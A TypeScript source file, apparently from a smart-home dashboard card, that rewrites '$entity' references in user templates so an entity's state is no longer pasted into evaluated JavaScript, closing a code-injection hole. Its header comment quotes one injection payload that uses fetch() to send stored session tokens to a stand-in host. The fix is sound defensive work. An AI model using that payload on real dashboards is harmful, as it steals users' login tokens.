/*
 * entity_template: JavaScript between [[[ ]]] where $entity stands for the entity's state.
 *
 * The state used to be pasted into the code as text before eval, so a state such as
 *   x'; fetch('https://evil.example/?' + localStorage.hassTokens); '
 * ran as code in the dashboard with the viewer's session. The state is now never part of the code:
 * every $entity is rewritten to a reference to a variable that holds it.
 *   - inside a '...' or "..." string:  'State: $entity'  ->  ('State: ' + __f3d_s + '')
 *   - inside a `...` template:          `$entity W`       ->  `${__f3d_s} W`
 *   - anywhere else (code):             $entity > 20      ->  __f3d_v > 20
 * __f3d_s is the state as a string; __f3d_v is the state as a number when it reads as one (what
 * pasting a numeric state into code gave), the string otherwise. A template that worked before gives
 * the same result; a state that is not a plain value can no longer change what the code does.
 */

const S = '__f3d_s';
const V = '__f3d_v';
const TOKEN = '$entity';

// a '...' or "..." string that held $entity is wrapped in brackets once closed, so a method call on it
// ('$entity'.length) applies to the whole string, not to its last piece
type Mode = { kind: 'code'; depth: number; inTemplate: boolean } | { kind: "'" | '"' | '`'; start: number; split: boolean };

/** The template body with every $entity turned into a variable reference (see above). */
export function rewriteEntityTemplate(body: string): string {
  const stack: Mode[] = [{ kind: 'code', depth: 0, inTemplate: false }];
  let out = '';
  let i = 0;
  const n = body.length;
  while (i < n) {
    const top = stack[stack.length - 1];
    const c = body[i];
    if (top.kind === 'code') {
      if (body.startsWith(TOKEN, i)) { out += V; i += TOKEN.length; continue; }
      if (c === '/' && body[i + 1] === '/') {
        const end = body.indexOf('\n', i);
        const stop = end < 0 ? n : end;
        out += body.slice(i, stop); i = stop; continue;
      }
      if (c === '/' && body[i + 1] === '*') {
        const end = body.indexOf('*/', i + 2);
        const stop = end < 0 ? n : end + 2;
        out += body.slice(i, stop); i = stop; continue;
      }
      if (c === "'" || c === '"' || c === '`') { stack.push({ kind: c, start: out.length, split: false }); out += c; i++; continue; }
      if (c === '{') { top.depth++; out += c; i++; continue; }
      if (c === '}') {
        if (top.inTemplate && top.depth === 0) stack.pop(); // back into the `...` template
        else top.depth--;
        out += c; i++; continue;
      }
      out += c; i++; continue;
    }
    // inside a string or a template literal
    if (c === '\\') { out += body.slice(i, i + 2); i += 2; continue; }
    if (c === top.kind) {
      stack.pop(); out += c; i++;
      if (top.split) out = out.slice(0, top.start) + '(' + out.slice(top.start) + ')';
      continue;
    }
    if (body.startsWith(TOKEN, i)) {
      if (top.kind === '`') out += '${' + S + '}';
      else { out += `${top.kind} + ${S} + ${top.kind}`; top.split = true; }
      i += TOKEN.length; continue;
    }
    if (top.kind === '`' && c === '$' && body[i + 1] === '{') {
      stack.push({ kind: 'code', depth: 0, inTemplate: true });
      out += '${'; i += 2; continue;
    }
    out += c; i++;
  }
  return out;
}

const NUMBER = /^\s*[-+]?(\d+\.?\d*|\.\d+)(e[-+]?\d+)?\s*$/i;

/** The state as code saw it when it was pasted in: a number when it reads as one. */
function bareValue(state: string): string | number {
  return NUMBER.test(state) ? Number(state) : state;
}

type Compiled = (s: string, v: string | number) => any;
const cache = new Map<string, Compiled>();
const CACHE_MAX = 500;

function compile(body: string): Compiled {
  let fn = cache.get(body);
  if (!fn) {
    // a direct eval inside the function keeps what [[[ ]]] always allowed (statements, the value of the
    // last one) and sees the two variables; the code text holds no state
    fn = new Function(S, V, 'return eval(' + JSON.stringify(rewriteEntityTemplate(body)) + ');') as Compiled;
    if (cache.size >= CACHE_MAX) cache.clear();
    cache.set(body, fn);
  }
  return fn;
}

/** Run an entity_template body (the text between [[[ and ]]]) for a state. */
export function runEntityTemplate(body: string, state: string): any {
  const s = String(state ?? '');
  return compile(body)(s, bareValue(s));
}
